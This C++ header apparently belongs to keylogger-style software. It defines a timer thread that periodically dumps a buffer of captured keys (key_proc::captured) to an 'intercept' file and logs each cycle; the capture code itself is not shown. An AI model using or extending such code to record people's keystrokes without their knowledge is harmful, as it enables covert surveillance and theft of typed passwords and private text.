#ifndef THREAD_HANDLER
#define THREAD_HANDLER

#include <string>
#include <chrono>
#include <thread>

#include "file_handler.h"
#include "key_proc.h"

using namespace std;

namespace thread_handler
{
    bool run = false;

    void timer(int t)
    {
        file_handler::write_logs("Thread created");
        bool check = false;
        while (true)
        {
            file_handler::write_logs("Timer started");
            this_thread::sleep_for(chrono::seconds(t));
            file_handler::write_logs("Timer expired");
            check = file_handler::write_intercept(key_proc::captured.str());
            if (!check || !run)
                break;
            key_proc::captured.str("");
        }
        file_handler::write_logs("Thread stopped");
    }

} // namespace thread_handler

#endif